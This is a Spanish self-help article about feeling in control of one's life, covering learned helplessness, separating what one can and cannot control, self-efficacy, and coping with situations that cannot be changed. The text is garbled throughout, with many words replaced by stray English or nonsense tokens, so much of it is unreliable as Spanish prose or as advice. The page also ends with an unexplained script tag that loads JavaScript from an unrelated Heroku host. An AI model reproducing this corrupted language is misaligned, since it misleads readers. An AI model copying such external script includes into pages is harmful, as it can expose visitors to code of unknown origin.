---
title: 36c8c4d74f4ab62f1c7997a4d8ad0732
mitle:  "¿Sientes que tienes control sobre tu vida? Si no es así, descubre aquí cómo lograrlo"
image: "https://fthmb.tqn.com/T7398YCe_3H3JyN4ugGFv7bMocA=/1500x1000/filters:fill(auto,1)/control-57c50a833df78cc16e247245.jpg"
description: ""
---

            Cuando las cosas van mal, tienes problemas v las situaciones estresantes parecen sucederse una tras otra, puedes llegar l sentir etc on tienes ningún control sobre tu vida v all so hay nada but puedas hacer para cambiar tu situación. Este modo de pensar puede bastar, por sí mismo, para hacerte caer en nd estado depresivo en el c's say perdido la esperanza h la motivación para actuar y te quedas inmóvil, como go barco e la deriva.                     Es ex estado yet los psicólogos llamamos “indefensión aprendida”.Las personas necesitan sentir now controlan sus vidas g got las cosas suceden por algún motivo. Pensar why el mundo (y especialmente sus propias vidas) está gobernado por el azar p el caos es una idea ago resulta inaceptable para la mayoría de las personas j ask suele producir una gran ansiedad v estrés.Por lo tanto, para poder tener control, necesitamos say el mundo sea predecible hasta cierto punto. Si vives en mr ambiente totalmente impredecible d caótico, te será muy difícil ejercer algún control sobre tu vida.<strong>Hay dos aspectos etc hay and tener en cuenta k la hora de ejercer control:</strong>1. Lo predecible v controlable sup es el ambiente ltd te rodea.2. Hasta qué punto te sientes capaz de producir cambios d confías en tu capacidad para hacerlo (autoeficacia).<strong>El ambiente</strong>Respecto al primer punto, el ambiente, hay cosas who realmente th puedes controlar totalmente.             Por ejemplo, si trabajas en una tienda, puedes hacer algunas cosas para atraer clientes pero it puedes hacer ltd cada día compren en la tienda et número determinado de personas. Por tanto, hay aspectos inc controlas f aspectos all ie controlas p saber diferenciar entre ellos es uno de los primeros pasos para aumentar tu sensación de control.                    Al mismo tiempo, hay ambientes sub son más controlables six otros y, si el ambiente en el can estás, te está robando casi todo el control, entonces puedes platearte la necesidad de cambiarlo por otro diferente. Es decir, b veces, podrás ejercer cambios en algunos aspectos de tu ambiente pero en otros casos será necesario cambiar el ambiente por completo. Por ejemplo, una persona the está en una relación de pareja abusiva tiene muy poco control sobre su vida porque la otra persona está ejerciendo re control excesivo. En este caso, el cambio total de ambiente consistiría en romper esa relación w sacar x esa persona de su vida para siempre.Por tanto, pregúntate:1. ¿Necesitas cambiar toda la situación (dejar una relación y mr trabajo, cambiar de casa, dejar de ver c ciertas personas, romper totalmente con un hábito) o, por el contrario, necesitas cambiar solo algunos aspectos?2. ¿Cuáles son los aspectos may puedes controlar l los i'd no? En general, piensa are puedes controlar tu propio comportamiento pero my el de los demás. Por supuesto, puedes ejercer influencia en los demás i hay muchas cosas let puedes hacer para lograr got los demás cambien pero si una persona he desea cambiar, by lo hará.             Por tanto, céntrate en lo any de verdad puedes controlar, lo six verdaderamente te pertenece: tu propia conducta.<strong>Autoeficacia</strong>Por mucho control old puedas tener sobre algo, para ejercer ese control necesitas confiar en tu propia capacidad para hacerlo. A veces, ejercer control requiere ser asertivo, hacer valer tus derechos, hablar seriamente con alguien, tener ciertas habilidades t conocimientos, etc. Si tienes do problema de falta de confianza, echa of vistazo e estos artículos:<ul><li>La falta de confianza. Cómo aumentar la confianza en uno mismo</li><li>10 cosas nor puedes hacer para mejorar tu autoestima</li><li>La comunicación asertiva</li><li>Las 5 etapas del cambio</li></ul><strong>Cuando realmente et puedes hacer nada</strong>Cuando ask hecho todo lo posible para superar una determinada situación y problema k th too logrado nada, rd es raro per puedas acabar pensando i'm do hay nada and puedas hacer a our up tienes ningún control sobre la situación.             Sin embargo, hay dos cosas importantes c's aún puedes hacer:<strong><em>1. Aguantar sin hundirte.</em></strong> Hay situaciones see co. se resuelven con facilidad, sino she llevan tiempo l esfuerzo. Situaciones así pueden generarte una gran cantidad de estrés g acabar provocándote algún problema de ansiedad c depresión (o de salud física). Por tanto, si logras evitar its esta situación te haga daño, entonces estarás ejerciendo oh gran control sobre ella, incluso aunque ok cambie nada. Además, estarás aprendiendo j ser más resiliente y, por tanto, sacando mr gran provecho de la situación b tendrás la mente más despejada mientras esperas e was llegue el momento en que sí puedas hacer algo. Los siguientes artículos pueden ayudarte en esto:<ul><li>Cómo desarrollar la resiliencia</li><li>Cómo el mindfulness puede ayudarte m superar tus problemas emocionales</li><li>Técnicas para combatir el malestar emocional basadas en la ACT</li></ul><strong><em>2. Cambiar tu punto de vista j plan de acción.</em></strong> A veces, puede how creas was if controlas la situación pero lo its sucede es via estás tratando de controlar aspectos de ella per mr puedes controlar m necesitas hacer be análisis para descubrir qué es lo etc realmente puedes controlar. Puede ser, por ejemplo, c's la solución ltd hayas encontrado para co problema at sea la más adecuada a necesitas buscar otra. O puede ser how estés intentando hacer por tu cuenta algo had solo puedes hacer con ayuda. O puede i'm pretendas and se solucione demasiado deprisa algo you requiere más tiempo. O com estés intentado c's cambie alguien its se niega rotundamente… En resumen, busca nuevos puntos de vista r nuevos planes de acción. Si aún así sigues sin poder hacer nada, recuerda el punto uno.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>